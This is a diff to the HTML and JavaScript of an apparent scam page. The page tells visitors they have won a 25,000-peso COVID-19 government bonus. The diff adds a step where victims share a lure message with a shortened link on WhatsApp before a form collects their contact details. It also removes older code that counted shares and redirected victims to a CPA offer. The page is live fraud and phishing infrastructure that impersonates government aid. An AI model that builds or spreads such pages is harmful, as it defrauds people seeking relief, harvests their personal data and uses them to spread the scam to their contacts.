@@ -418,16 +418,16 @@
 	</div>
 	
 	<div id="p7" style="display:none;">
-		<div class="lujn5">¡Felicitaciones, te has ganado un BONO de <b>25,000</b> pesos!</div>
-		<div class="x9m3i">Para retirar el bono, debemos <b>verificar tus datos</b>:</div>
+        <div class="lujn5">¡Felicitaciones, te has ganado un BONO de <b>25,000</b> pesos!</div>
+        <div class="x9m3i" id="share">Para retirar el bono, debes compartir el mensaje en whatsapp</div>
+		<div class="x9m3i" id="verify">Ahora debemos <b>verificar tus datos</b>:</div>
 		<div class="x9m3i" id="complete">
 			Completa los campos a continuación para ser contactado y recibir tu bono.
 		</div>
 		
-		<!-- <button class="btn n7qcf" id="b6">
+		<a href="https://api.whatsapp.com/send?text=%C2%A1%C2%A1%20Bono%20Gobierno%20Mexico!!%20%E2%80%93%20Revisa%20aqu%C3%AD%20si%20ganaste%20el%20bono%20por%20el%20COVID%2019%20https://bit.ly/2KNDuID" target="_blank" class="btn n7qcf" id="b6">
 			<img class="guatf" src="https://i.imgur.com/c1TO31W.png"> Compartir Bono en WhatsApp
-		</button>
-		<button class="btn vtykq" id="b7">Retirar Bono</button> -->
+        </a>
 
 		<form action="" id="form" class="mt-5">
 			<div class="form-row">
@@ -871,20 +871,6 @@ $(document).ready(function(){
 			$('#p6').hide();
 			$('#p7').show();
 		}, 5000);
-		
-	});
-	
-	$(document).on('click', '#b6', function(){
-		
-		clearInterval(time);
-		share_count = (share_count + 1);
-		
-		var text_link_share = getShareUrl();
-		window.open('whatsapp://send?text=' + text_link_share);
-		
-		if(share_count >= share_total){
-			window.location.href = rand_cpa;
-		}
 		
 	});
 	
